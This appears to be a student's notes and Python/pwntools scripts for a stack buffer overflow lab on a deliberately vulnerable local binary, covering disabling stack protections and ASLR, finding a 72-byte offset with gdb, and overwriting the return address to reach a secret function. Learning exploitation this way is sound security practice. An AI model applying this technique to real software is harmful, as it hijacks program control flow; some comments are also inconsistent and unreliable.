"""
1) first of all we need to compile the c program 

gcc -m64 -fno-stack-protector -z execstack -D_FORTIFY_SOURCE=0 -o vuln
vuln.c
    - -fno-stack-protector disables canaries
    - -z execstack allows executable code to be run inside the stack (NX bit off)
    - -m64 specifies the architecture (64-bit in this case)

    

2) see which security measure is putted over the binary file with
    chceksec vuln
    PIE is enabled but we will disable asrl on our machine at all


3) disable the ASRL on our machine because otherwise it will not work
    sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'



now we need to find the number of bytes we need to reach the rsp (equal to EIP)

4) gdb vuln 
5) disass main -> to see which function it will call-> we see that it calls greet_me
    5.1) disass greet_me -> we can see that there is strcpy that is vulnerable



6) pattern create 350 -> we create a pattern in gdb of 350 chars

7) b main -> to put a break point on the main 

8) run "created pattern"

9) disass greet_me -> to see the address of ret in the function greet_me ()

10) b *ret_address

11) c -> to continue to the ret_address breakpoint, here we can see which string is in rsp

12) pattern search "string found in rsp" -> we get the number of bytes we need to reach the rsp and overwrite it

"""

"""import sys

#find it with pattern create and pattern search 
bytes_to_reach_rsp = 72

#from point we know we have 216 bytes to reach the rsp 
nops=b'\x90'*(72 - 8)

#0x7fffffffe2c8 in this case 001011a9
rip_address=b'\xa9\x11\x10\x00\x00\x00\x00\x00'

#buff = b'\x55'*(bytes_to_reach_rsp -len(nops)-len(padding)-len(payload))



sys.stdout.buffer.write(nops+rip_address)

"""



from pwn import *

#USARE GHIDRA per vedere la funzione nascosta come si chiama
"""

static = ELF("./find_record")
secret_function_add = p64(static.symbols['secret_function'])
print(secret_function_add)

nops=b'A'*(72 - len(secret_function_add))
print(len(nops))

#print(static.functions['secret_function'])

payload = nops + secret_function_add + nops

p=process(["./find_record", payload])
p.interactive()
"""


"""static = ELF("./find_record")
secret_function_add = p64(static.symbols['secret_function'])
print(secret_function_add)"""


#lo possiamo anche trovare cos√¨ readlefl -s vuln | grep -i "secret_function"

secret_function_add = b'\x96\x11\x40\x00\x00\x00\x00\x00'

buff=b'\x55'*72


#print(static.functions['secret_function'])
sys.stdout.buffer.write(buff + secret_function_add)

